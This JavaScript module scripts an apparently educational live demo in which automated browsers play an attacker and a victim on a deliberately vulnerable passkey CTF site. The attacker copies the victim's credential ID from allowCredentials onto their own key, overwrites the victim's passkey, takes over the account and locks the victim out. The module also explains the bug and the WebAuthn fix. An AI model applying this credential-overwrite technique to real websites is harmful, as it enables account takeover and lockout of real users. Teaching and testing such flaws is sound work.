import { randomUUID } from 'node:crypto';
import {
  restartBrowsers, configureExtension, initLocalKeyStore, openCtfInstance,
  createCtfAccount, registerDefaultPasskey, logOutOfCtf, shownKeyName,
} from '../setup.js';
import {
  VICTIM_KEY, ATTACKER_KEY, CTF_PASSWORD, SELECTORS, sleep,
  learning, interceptor, interceptorOpen, usernameOf,
  openSettingsTask, addPasskeyTasks, sendTask, logoutTask, keepSelectionTask,
  usernameFirstPasskeyLoginTask, passwordFallbackLoginTasks, removeUserHandleTask, passkeysToolsTabHighlight,
  keyOverwritten, attackerIsVictim, victimLockedOut,
} from './common.js';

/**
 * The attacker's view: the victim is already signed in with a passkey. The attacker knows
 * only the victim's username, learns the victim's credential ID from the username-first
 * login (allowCredentials), puts it on their own key in PASSKEYS-ATTACKER, overwrites the
 * victim's passkey, logs in as the victim, and the victim is locked out.
 *
 * Unlike the full story, the two browsers share nothing but the website: each keeps its
 * own local passkeys.tools key store.
 */

const VICTIM_NAME = 'victim';
const ATTACKER_NAME = 'attacker';

const SETUP_STAGES = [
  { id: 'browsers', label: 'Restart both browsers with fresh, empty profiles' },
  { id: 'extension', label: 'Install PASSKEYS-ATTACKER in both browsers, each with its own local key store' },
  { id: 'ctf', label: 'Open a fresh CTF instance with a username-first login and the vulnerable registration' },
  { id: 'accounts', label: 'Victim: account with a passkey, signed in · Attacker: own account, logged out' },
];

async function prepare({ browsers: { victim, attacker }, config, onStage }) {
  const instanceId = randomUUID();

  onStage('browsers');
  await restartBrowsers([victim, attacker]);

  onStage('extension');
  await Promise.all([victim, attacker].map(async (browser) => {
    await configureExtension(browser, config);
    await initLocalKeyStore(browser, config);
  }));

  onStage('ctf');
  const verifiers = {
    registrationVerifier: config.verifiers.registration,
    authenticationVerifier: config.verifiers.usernameFirstLogin,
  };
  await Promise.all([
    openCtfInstance(victim, config, instanceId, verifiers),
    openCtfInstance(attacker, config, instanceId, verifiers),
  ]);

  onStage('accounts');
  await Promise.all([
    (async () => {
      await createCtfAccount(victim, config, VICTIM_NAME, CTF_PASSWORD);
      await registerDefaultPasskey(victim, config);
    })(),
    (async () => {
      await createCtfAccount(attacker, config, ATTACKER_NAME, CTF_PASSWORD);
      await logOutOfCtf(attacker, config);
    })(),
  ]);
  return { instanceId };
}

// ─── Recon facts ────────────────────────────────────────────────────────────

const recon = (s) => s.facts.scenario;
const leakedId = (s) => recon(s).leakedCredentialId ?? null;
/** The attacker's key that carries the victim's credential ID (normally "attacker | ES256"). */
const forgedKey = (s) => recon(s).forgedKey ?? ATTACKER_KEY;
const victimName = (s) => usernameOf(s, 'victim');

/** Latches recon progress from what is visible in the attacker's browser. */
function observe(s) {
  const r = recon(s);
  const view = interceptor(s, 'attacker');
  if (!r.leakedCredentialId && !s.facts.overwrite && view?.op === 'get' && view.allowCredentials.length > 0) {
    [r.leakedCredentialId] = view.allowCredentials;
  }
  if (!r.leakedCredentialId) return;
  const copied = s.facts.lastCopy.attacker ?? '';
  if (!r.copied && copied.includes(r.leakedCredentialId)) r.copied = true;
  if (!r.keysTabSeen && view?.tab === '/keys') r.keysTabSeen = true;
  if (!r.forgedKey && view?.keyCredentialIds) {
    const leakedHex = Buffer.from(r.leakedCredentialId, 'base64url').toString('hex');
    const match = Object.entries(view.keyCredentialIds).find(([, credentialId]) => credentialId === leakedHex);
    if (match) r.forgedKey = shownKeyName(match[0]);
  }
  if (r.forgedKey && !r.reconClosed && !interceptorOpen(s, 'attacker', 'get')) r.reconClosed = true;
  if (r.reconClosed && !r.attackerLoggedIn && learning(s, 'attacker')?.user === usernameOf(s, 'attacker')) r.attackerLoggedIn = true;
}

const idFound = (s) => Boolean(recon(s).copied || recon(s).keysTabSeen || recon(s).forgedKey);
const keyForged = (s) => Boolean(recon(s).forgedKey);
const reconFinished = (s) => Boolean(recon(s).reconClosed);
const attackerLoggedIn = (s) => Boolean(recon(s).attackerLoggedIn) || keyOverwritten(s);

// ─── Recon tasks ────────────────────────────────────────────────────────────

const copyCredentialIdTask = {
  id: 'copy-credential-id',
  text: 'The interceptor shows the website’s request: <code>allowCredentials</code> holds the victim’s credential ID. Copy it (<b>Ctrl+C</b>)',
  done: idFound,
  highlight: (s) => (interceptorOpen(s, 'attacker', 'get') && leakedId(s) ? {
    page: 'interceptor',
    targets: [{
      id: 'leaked-id',
      selectors: [SELECTORS.requestTextarea],
      label: 'Selected: the victim’s credential ID → press Ctrl+C',
      select: { text: leakedId(s) },
    }],
  } : null),
  run: async ({ browser, state }) => {
    const page = await browser.waitForInterceptorPage();
    await browser.focus(page);
    await sleep(1200);
    await page.evaluate((id) => {
      const textarea = document.getElementById('interceptorRequestTextarea');
      const start = textarea.value.indexOf(id);
      textarea.focus();
      textarea.setSelectionRange(start, start + id.length);
    }, leakedId(state()));
    await sleep(600);
    await page.keyboard.press('Control+C');
  },
};

const openKeysTabTask = {
  id: 'open-keys-tab',
  text: 'Open PASSKEYS-ATTACKER’s <b>Keys</b> tab (☰ menu → <b>Keys</b>)',
  done: (s) => interceptor(s, 'attacker')?.tab === '/keys' || keyForged(s),
  highlight: (s) => (interceptorOpen(s, 'attacker', 'get') ? passkeysToolsTabHighlight(s, 'attacker', 'keys', 'Click “Keys”') : null),
  run: async ({ browser }) => {
    const page = await browser.waitForInterceptorPage();
    await browser.openPasskeysToolsTab(page, 'keys');
  },
};

const pasteCredentialIdTask = {
  id: 'paste-credential-id',
  text: 'Under <b>Update Credential ID</b>, paste it into <b>B64URL</b> (<b>Ctrl+V</b>)',
  done: (s) => interceptor(s, 'attacker')?.keysForm.b64url.trim() === leakedId(s) || keyForged(s),
  highlight: (s) => (interceptor(s, 'attacker')?.tab === '/keys' ? {
    page: 'interceptor',
    targets: [{ id: 'paste', selectors: [SELECTORS.keysUpdateB64url], label: 'Paste the victim’s credential ID (Ctrl+V)' }],
  } : null),
  run: async ({ browser, state }) => {
    const page = await browser.waitForInterceptorPage();
    const field = page.locator(SELECTORS.keysUpdateB64url);
    await field.click();
    await page.keyboard.press('Control+V');
    await sleep(300);
    // Fall back to typing if the clipboard was not available to the automation.
    if ((await field.inputValue()).trim() !== leakedId(state())) await field.fill(leakedId(state()));
  },
};

const chooseOwnKeyTask = {
  id: 'choose-own-key',
  text: `Make sure the attacker’s own key <code>${ATTACKER_KEY}</code> is selected`,
  done: (s) => interceptor(s, 'attacker')?.keysForm.key === ATTACKER_KEY || keyForged(s),
  highlight: (s) => (interceptor(s, 'attacker')?.tab === '/keys' ? {
    page: 'interceptor',
    targets: [{ id: 'own-key', selectors: [SELECTORS.keysUpdateKey], label: `Choose “${ATTACKER_KEY}”` }],
  } : null),
  run: async ({ browser }) => {
    const page = await browser.waitForInterceptorPage();
    await page.selectOption(SELECTORS.keysUpdateKey, { label: ATTACKER_KEY });
  },
};

const updateKeyTask = {
  id: 'update-key',
  text: 'Click <b>Update</b>',
  done: keyForged,
  highlight: (s) => (interceptor(s, 'attacker')?.tab === '/keys' ? {
    page: 'interceptor',
    targets: [{ id: 'update', selectors: [SELECTORS.keysUpdateButton], label: 'Click “Update”' }],
  } : null),
  run: async ({ browser }) => {
    const page = await browser.waitForInterceptorPage();
    await page.click(SELECTORS.keysUpdateButton);
  },
};

const dismissLoginTask = {
  id: 'dismiss-login',
  text: 'Back in the <b>Interceptor</b> tab, click <b>Dismiss</b> to cancel this login',
  done: reconFinished,
  highlight: (s) => {
    if (!interceptorOpen(s, 'attacker', 'get')) return null;
    if (interceptor(s, 'attacker').tab !== '/interceptor') {
      return passkeysToolsTabHighlight(s, 'attacker', 'interceptor', 'Click “Interceptor”');
    }
    return { page: 'interceptor', targets: [{ id: 'dismiss', selectors: [SELECTORS.dismiss], label: 'Click “Dismiss”' }] };
  },
  run: async ({ browser }) => {
    const page = await browser.waitForInterceptorPage();
    await browser.openPasskeysToolsTab(page, 'interceptor');
    await sleep(400);
    await page.click(SELECTORS.dismiss);
    const learningTab = browser.learningPage();
    if (learningTab) await browser.focus(learningTab);
  },
};

// ─── Steps ──────────────────────────────────────────────────────────────────

const steps = [
  {
    id: 'intro',
    short: 'Intro',
    marker: 'i',
    focus: null,
    kicker: 'Live demo · The attacker’s view',
    title: 'From a username to account takeover',
    lead: 'The attacker knows nothing but the victim’s username. Watch them find the victim’s credential ID, overwrite the victim’s passkey, and take over the account.',
    points: [
      '<span class="tag victim">Left</span> the victim: signed in, with a passkey, on the passkey management page. <span class="tag attacker">Right</span> the attacker: an ordinary account on the same website, logged out.',
      'Both use <b>PASSKEYS-ATTACKER</b> as their authenticator, but share nothing: separate keys, separate storage. The attacker never touches the victim’s device.',
      'The CTF website uses a username-first login and has a registration bug (verifier “Cred Overwrite”, WebAuthn §7.1.26).',
    ],
    why: {
      title: 'Passkeys in 20 seconds',
      body: 'A passkey is a key pair. The <b>private key</b> never leaves the user’s device. The website stores the <b>public key</b> together with a <b>credential ID</b> that names the passkey. To log in, the device signs a challenge, and the website checks the signature with the stored public key.',
    },
    callout: 'Already done behind the scenes: fresh browsers with the extension, a fresh CTF instance, the account <code>victim</code> with a passkey (see the database on the right), and the attacker’s account <code>attacker</code>.',
    tasks: [],
    complete: () => true,
  },
  {
    id: 'find-credential-id',
    short: 'Find the ID',
    marker: '1',
    focus: 'attacker',
    quietLoginFailures: true,
    kicker: 'Step 1 · Attacker',
    title: 'Find out the victim’s credential ID',
    lead: 'The attacker starts a login as the victim. That is enough: the website answers with the victim’s credential ID.',
    why: {
      title: 'The leak',
      body: 'With a username-first login, the website tells the authenticator which passkeys may answer: it returns the user’s credential IDs in <code>allowCredentials</code> — to <b>anyone</b> who types the username. That is allowed: credential IDs are not secrets, so no website may rely on them being secret.',
    },
    tasks: [
      usernameFirstPasskeyLoginTask('attacker', victimName, 'Click <b>Login</b>, type the victim’s username <code>{victim}</code>, click <b>Continue</b>', (s) => Boolean(leakedId(s))),
      copyCredentialIdTask,
    ],
    complete: idFound,
    doneMessage: '🔎 Victim’s credential ID: {leaked}',
  },
  {
    id: 'forge-key',
    short: 'Borrow the ID',
    marker: '2',
    focus: 'attacker',
    quietLoginFailures: true,
    kicker: 'Step 2 · Attacker',
    title: 'Give the attacker’s own key the victim’s credential ID',
    lead: 'Still in the interceptor tab, the attacker edits PASSKEYS-ATTACKER’s key store, then cancels the login.',
    why: {
      title: 'A key with a borrowed name',
      body: 'The key pair stays the attacker’s own — only its credential ID now equals the victim’s. When the attacker registers a passkey with it, the website receives the <b>victim’s credential ID</b> together with the <b>attacker’s public key</b>.',
    },
    tasks: [openKeysTabTask, pasteCredentialIdTask, chooseOwnKeyTask, updateKeyTask, dismissLoginTask],
    complete: reconFinished,
    doneMessage: `🔑 ${ATTACKER_KEY} now carries the victim’s credential ID`,
  },
  {
    id: 'attacker-login',
    short: 'Log in',
    marker: '3',
    focus: 'attacker',
    kicker: 'Step 3 · Attacker',
    title: 'Log in to the attacker’s own account',
    lead: 'An ordinary account on the same website is all the attacker needs.',
    why: {
      title: 'Nothing special',
      body: 'The attacker’s account has no passkey, so the username-first login falls back to the password. Next, the attacker adds a “passkey” to this account.',
    },
    tasks: passwordFallbackLoginTasks('attacker', ATTACKER_NAME, attackerLoggedIn),
    complete: attackerLoggedIn,
    doneMessage: '✓ Logged in as “{attacker}”',
  },
  {
    id: 'overwrite',
    short: 'Overwrite',
    marker: '4',
    focus: 'attacker',
    kicker: 'Step 4 · Attacker',
    title: 'Overwrite the victim’s passkey',
    lead: 'The attacker registers a passkey on their own account with the key that carries the victim’s credential ID.',
    why: {
      title: 'The bug',
      body: 'A secure website must reject a credential ID that is already registered (WebAuthn §7.1.26). This one instead <b>overwrites the public key</b> of the victim’s passkey with the attacker’s key. On the victim’s side nothing looks different — same passkey, same name.',
    },
    tasks: [
      openSettingsTask('attacker', keyOverwritten),
      ...addPasskeyTasks('attacker', keyOverwritten),
      keepSelectionTask('attacker', 'create', (s) => ({ credentialId: forgedKey(s), key: ATTACKER_KEY }),
        `Keep <b>Credential ID</b> and <b>Key</b> = <code>${ATTACKER_KEY}</code> — the Response’s <code>id</code> is now the victim’s credential ID`, keyOverwritten),
      sendTask('attacker', 'create', keyOverwritten),
    ],
    complete: keyOverwritten,
    doneMessage: '🚩 Flag captured: {flag}',
  },
  {
    id: 'takeover',
    short: 'Takeover',
    marker: '5',
    focus: 'attacker',
    kicker: 'Step 5 · Attacker',
    title: 'Log in as the victim',
    lead: 'The attacker starts a login as the victim again. This time the attacker’s key matches what the website has stored.',
    why: {
      title: 'Why the login works',
      body: 'The website asks for the victim’s credential ID and checks the signature against the public key stored for it — which is now the attacker’s. The signature is valid, so the attacker is logged in <b>as the victim</b>.',
    },
    tasks: [
      logoutTask('attacker', 'Close the flag pop-up and log out: <b>{attacker}</b> → <b>Logout</b>', attackerIsVictim),
      usernameFirstPasskeyLoginTask('attacker', victimName, 'Click <b>Login</b>, type <code>{victim}</code>, click <b>Continue</b>', attackerIsVictim),
      keepSelectionTask('attacker', 'get', (s) => ({ credentialId: forgedKey(s), key: ATTACKER_KEY }),
        `The interceptor picks the key carrying the victim’s credential ID: keep <code>${ATTACKER_KEY}</code>`, attackerIsVictim),
      removeUserHandleTask('attacker', 'Delete the <code>userHandle</code> line in the Response (<b>Delete</b>): it names the attacker’s own account', attackerIsVictim),
      sendTask('attacker', 'get', attackerIsVictim),
    ],
    complete: attackerIsVictim,
    doneMessage: '😈 Logged in as “{victim}” — account takeover!',
  },
  {
    id: 'lockout',
    short: 'Lockout',
    marker: '6',
    focus: 'victim',
    kicker: 'Step 6 · Victim',
    title: 'The victim is locked out',
    lead: 'The victim logs out — and tries to log in again with their own, genuine passkey.',
    why: {
      title: 'Locked out',
      body: 'The website now checks the victim’s signature against the attacker’s public key. It does not match, so the victim can no longer log in to their own account.',
    },
    tasks: [
      logoutTask('victim', 'Log out: <b>{victim}</b> → <b>Logout</b>', victimLockedOut),
      usernameFirstPasskeyLoginTask('victim', victimName, 'Click <b>Login</b>, type <code>{victim}</code>, click <b>Continue</b>', victimLockedOut),
      keepSelectionTask('victim', 'get', { credentialId: VICTIM_KEY, key: VICTIM_KEY },
        `The victim’s authenticator signs with the victim’s genuine key: keep <code>${VICTIM_KEY}</code>`, victimLockedOut),
      sendTask('victim', 'get', victimLockedOut),
    ],
    complete: victimLockedOut,
    doneMessage: '🔒 “{victim}” is locked out of their own account',
  },
  {
    id: 'summary',
    short: 'Takeaways',
    marker: '★',
    focus: null,
    kicker: 'Takeaways',
    title: 'A username in, an account out',
    points: [
      '<b>Leak:</b> a username-first login hands the victim’s credential IDs to anyone (<code>allowCredentials</code>). That is allowed — credential IDs are not secrets.',
      '<b>Bug:</b> the website accepted a registration with a credential ID that already belonged to the victim — and replaced the victim’s public key.',
      '<b>Fix:</b> reject every registration whose credential ID is already registered, for <em>any</em> user (WebAuthn §7.1.26).',
      '<b>In the wild:</b> of 103 passkey websites we tested, 12 accepted the victim’s credential ID in another account; on 5, the victim’s key was overwritten (CVSS 9.1, critical).',
    ],
    why: {
      title: 'Try it yourself',
      body: '<b>passkeys.tools</b> — PASSKEYS-ATTACKER, our open-source passkey testing tool<br><b>learning.passkeys.tools</b> — the CTF with 38 vulnerable verifiers<br><b>Paper:</b> “The State of Passkeys”, USENIX Security 2026',
    },
    tasks: [],
    complete: () => true,
  },
];

export default {
  id: 'attacker-view',
  title: 'Attacker’s view',
  summary: 'The victim is already signed in with a passkey. The attacker learns the victim’s credential ID from the login page, overwrites the victim’s passkey, takes over the account, and the victim is locked out.',
  presetNames: { victim: VICTIM_NAME, attacker: ATTACKER_NAME },
  separateKeyStores: true,
  setupStages: SETUP_STAGES,
  prepare,
  observe,
  steps,
  notices: {
    overwriteMissed: 'That created a brand-new passkey for the attacker — its credential ID was not the victim’s. Check step 2: the attacker’s key must carry the victim’s credential ID.',
  },
};
